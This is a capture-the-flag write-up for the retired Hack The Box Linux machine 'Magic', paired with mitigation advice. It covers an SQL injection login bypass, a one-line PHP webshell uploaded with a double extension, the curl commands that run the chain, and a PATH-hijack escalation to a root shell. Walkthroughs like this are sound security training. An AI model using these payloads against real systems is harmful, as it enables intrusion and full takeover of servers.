---
machine: Magic
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, sqli, file-upload, suid, path-hijack]
---

# Magic — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

The login is vulnerable to SQLi and lets an attacker in as administrator. Upload validation is lax and accepts a `.php.jpg` file that Apache executes as PHP. The database leaks the `theseus` password; a SUID binary calling `popen` without an absolute path is exploited with a PATH hijack.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- Ports: `22/tcp` SSH and `80/tcp` HTTP.
- Services: Apache with PHP, MySQL and a local SUID binary.
- Technologies: PHP, MySQL, Apache, SUID, PATH hijack.

## Enumeration

- `magic.htb` with a gallery and login.
- Image upload form.
- `db.php` with MySQL credentials.
- System user `theseus`.

## Foothold

Bypass the login with `admin' or 1=1-- -` and upload a PHP file disguised as an image. The `.php.jpg` double extension evades the filter and Apache executes it from the upload path.

```bash
curl -s -c cookies.txt -d "username=admin' or 1=1-- -&password=x" http://magic.htb/login.php
printf '<?php system($_GET["c"]); ?>' > shell.php.jpg
curl -s -b cookies.txt -F "image=@shell.php.jpg" http://magic.htb/upload.php
curl "http://magic.htb/images/shell.php.jpg?c=id"
```

## Lateral movement

The webshell reads `db.php`; the MySQL password is reused for the `theseus` system user, who has SSH access.

## Privilege escalation

A SUID binary runs `popen("cat ...")` without an absolute path. Place a malicious `cat` in `/tmp`, prepend `/tmp` to PATH and invoke the binary for a root shell.

```bash
find / -perm -4000 -type f 2>/dev/null
strings /bin/magic
printf '#!/bin/sh\n/bin/sh\n' > /tmp/cat && chmod +x /tmp/cat
export PATH=/tmp:$PATH
/bin/magic
```

## Evidence

- Administrative login after SQLi.
- Webshell executing commands from the upload path.
- SUID binary and root shell after the PATH hijack.

## Lessons learned

- Extension blacklists miss alternative handlers.
- Login SQLi can grant admin access without cracking anything.
- SUID binaries must use absolute paths and a clean environment.

## Mitigation and detection

- Use parameterized queries and extension allowlists.
- Serve uploads without execution and validate real content.
- Fix the binary to use absolute paths and sanitize PATH.

## References

- [0xdf — Magic](https://0xdf.gitlab.io/2020/08/22/htb-magic.html)
- [IppSec — Magic](https://www.youtube.com/watch?v=bLIcew9Iot8)
- [Hack The Box — Magic](https://app.hackthebox.com/machines/magic)
